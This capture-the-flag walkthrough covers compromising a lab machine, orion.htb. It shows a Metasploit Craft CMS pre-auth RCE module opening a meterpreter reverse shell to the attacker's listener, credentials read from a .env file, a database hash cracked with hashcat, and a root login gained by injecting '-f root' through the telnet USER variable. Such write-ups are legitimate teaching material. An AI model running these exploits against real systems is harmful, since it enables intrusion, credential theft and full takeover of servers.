## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV -v 10.129.13.155
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-29 15:22 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:22
Completed NSE at 15:22, 0.00s elapsed
Initiating NSE at 15:22
Completed NSE at 15:22, 0.00s elapsed
Initiating NSE at 15:22
Completed NSE at 15:22, 0.00s elapsed
Initiating Ping Scan at 15:22
Scanning 10.129.13.155 [4 ports]
Completed Ping Scan at 15:22, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:22
Completed Parallel DNS resolution of 1 host. at 15:22, 0.50s elapsed
Initiating SYN Stealth Scan at 15:22
Scanning 10.129.13.155 [1000 ports]
Discovered open port 22/tcp on 10.129.13.155
Discovered open port 80/tcp on 10.129.13.155
Completed SYN Stealth Scan at 15:22, 1.90s elapsed (1000 total ports)
Initiating Service scan at 15:22
Scanning 2 services on 10.129.13.155
Completed Service scan at 15:22, 6.38s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.13.155.
Initiating NSE at 15:22
Completed NSE at 15:22, 4.93s elapsed
Initiating NSE at 15:22
Completed NSE at 15:22, 0.73s elapsed
Initiating NSE at 15:22
Completed NSE at 15:22, 0.00s elapsed
Nmap scan report for 10.129.13.155
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 15:22
Completed NSE at 15:22, 0.00s elapsed
Initiating NSE at 15:22
Completed NSE at 15:22, 0.00s elapsed
Initiating NSE at 15:22
Completed NSE at 15:22, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.28 seconds
           Raw packets sent: 1035 (45.516KB) | Rcvd: 1002 (40.076KB)
```
## Web Emuneration
Fuzzing:
```bash
┌──(jameskaois㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://orion.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://orion.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 190ms]
.hta                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 188ms]
.htaccess               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 186ms]
.git/HEAD               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 186ms]
                        [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 209ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 473ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 200ms]
index.html              [Status: 200, Size: 9689, Words: 2708, Lines: 183, Duration: 191ms]
index                   [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 223ms]
index.php               [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 232ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 525ms]
:: Progress: [4614/4614] :: Job [1/1] :: 69 req/sec :: Duration: [0:00:58] :: Errors: 0 ::
```
Go to `/admin` found Craft CMS 5.6.16 search for vulnerabilities https://github.com/CTY-Research-1/CVE-2025-32432-PoC:
```bash
$ msfconsole
msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set RHOSTS orion.htb
RHOSTS => orion.htb
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set LHOST 10.10.15.11
LHOST => 10.10.15.11
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set LPORT 4444
LPORT => 4444
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit
[*] Started reverse TCP handler on 10.10.15.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Leaked session.save_path: /var/lib/php/sessions
[+] The target is vulnerable. Session path leaked
[*] Injecting stub & triggering payload...
[*] Sending stage (42137 bytes) to 10.129.13.155
[*] Meterpreter session 1 opened (10.10.15.11:4444 -> 10.129.13.155:50372) at 2026-06-29 15:44:53 +0700
meterpreter > ls
Listing: /var/www/html/craft/web
================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100664/rw-rw-r--  283   fil   2025-11-19 00:08:05 +0700  .htaccess
040755/rwxr-xr-x  4096  dir   2026-03-06 19:12:57 +0700  assets
040775/rwxrwxr-x  4096  dir   2026-06-29 15:30:14 +0700  cpresources
100644/rw-r--r--  9689  fil   2026-03-06 19:12:57 +0700  index.html
100664/rw-rw-r--  258   fil   2025-11-19 00:08:05 +0700  index.php

meterpreter > id
[-] Unknown command: id. Run the help command for more details.
meterpreter > shell
Process 1513 created.
Channel 0 created.

```
## Get user flag
```bash
ls
assets
cpresources
index.html
index.php
ls -la
total 36
drwxrwxr-x  4 www-data www-data 4096 Mar  7 15:31 .
drwxrwxr-x  7 www-data www-data 4096 Mar  6 11:22 ..
-rw-rw-r--  1 www-data www-data  283 Nov 18  2025 .htaccess
drwxr-xr-x  5 www-data www-data 4096 Mar  6 12:12 assets
drwxrwxr-x 19 www-data www-data 4096 Jun 29 08:30 cpresources
-rw-r--r--  1 www-data www-data 9689 Mar  6 12:12 index.html
-rw-rw-r--  1 www-data www-data  258 Nov 18  2025 index.php
ls -la ../
total 364
drwxrwxr-x  7 www-data www-data   4096 Mar  6 11:22 .
drwxr-xr-x  3 root     root       4096 Mar  6 11:19 ..
-rw-rw-r--  1 www-data www-data    718 Mar  6 11:24 .env
-rw-rw-r--  1 www-data www-data    411 Nov 18  2025 .env.example.dev
-rw-rw-r--  1 www-data www-data    623 Nov 18  2025 .env.example.production
-rw-rw-r--  1 www-data www-data    619 Nov 18  2025 .env.example.staging
-rw-rw-r--  1 www-data www-data     31 Nov 18  2025 .gitignore
-rw-rw-r--  1 www-data www-data    624 Nov 18  2025 bootstrap.php
-rw-rw-r--  1 www-data www-data    611 Mar  6 11:20 composer.json
-rw-rw-r--  1 www-data www-data 310507 Mar  6 11:20 composer.lock
drwxrwxr-x  4 www-data www-data   4096 Mar  6 11:26 config
-rwxr-xr-x  1 www-data www-data    309 Nov 18  2025 craft
drwxrwxr-x  5 www-data www-data   4096 Mar  6 11:24 storage
drwxrwxr-x  2 www-data www-data   4096 Mar 10 10:46 templates
drwxrwxr-x 49 www-data www-data   4096 Mar  6 11:20 vendor
drwxrwxr-x  4 www-data www-data   4096 Mar  7 15:31 web
cat ../.env
# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=dev

# General settings
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://orion.htb/
```
Found DB username and password, getting access to database found this:
```
SELECT * FROM users;
photoId affiliatedSiteId        active  pending locked  suspended       admin   username        fullName        firstName       lastName        email   password lastLoginDate   lastLoginAttemptIp      invalidLoginWindowStart invalidLoginCount       lastInvalidLoginDate    lockoutDate     hasDashboard    verificationCode verificationCodeIssuedDate      unverifiedEmail passwordResetRequired   lastPasswordChangeDate  dateCreated     dateUpdated
1       NULL    NULL    1       0       0       0       1       admin   NULL    NULL    NULL    adam@orion.htb  $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS     2026-03-12 11:25:04     NULL    NULL    NULL    NULL    NULL    1       NULL    NULL    NULL    0       2026-03-12 11:24:51     2026-03-06 11:24:45      2026-03-12 11:25:04
id      photoId affiliatedSiteId        active  pending locked  suspended       admin   username        fullName        firstName       lastName        email   password lastLoginDate   lastLoginAttemptIp      invalidLoginWindowStart invalidLoginCount       lastInvalidLoginDate    lockoutDate     hasDashboard    verificationCode verificationCodeIssuedDate      unverifiedEmail passwordResetRequired   lastPasswordChangeDate  dateCreated     dateUpdated
1       NULL    NULL    1       0       0       0       1       admin   NULL    NULL    NULL    adam@orion.htb  $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS     2026-03-12 11:25:04     NULL    NULL    NULL    NULL    NULL    1       NULL    NULL    NULL    0       2026-03-12 11:24:51     2026-03-06 11:24:45      2026-03-12 11:25:04
```
Decrypt `adam` password:
```bash
$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
<SNIP>
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
<SNIP>
```
```
adam@orion:~$ cat user.txt
ff44d481e075e0cc11da777182818017
adam@orion:~$ 
```
## Privilege Escalation
```bash
adam@orion:~$ ss -tulnp
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process 
udp    UNCONN  0       0        127.0.0.53%lo:53          0.0.0.0:*            
udp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53          0.0.0.0:*            
tcp    LISTEN  0       10           127.0.0.1:23          0.0.0.0:*            
tcp    LISTEN  0       80           127.0.0.1:3306        0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:80          0.0.0.0:*            
tcp    LISTEN  0       128               [::]:22             [::]:*            
adam@orion:~$ 
```
Port `23` is being listened in localhost
```
adam@orion:~$ telnet --version
telnet (GNU inetutils) 2.7
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by many authors.
adam@orion:~$ 
```
CVE-2026-24061 can be used
## Get root flag
```bash
adam@orion:~$ USER="-f root" telnet -a 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.

Linux 5.15.0-177-generic (orion) (pts/1)

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)

root@orion:~# cat root.txt
453faecac006a1836de4a9b772b5c67a
```
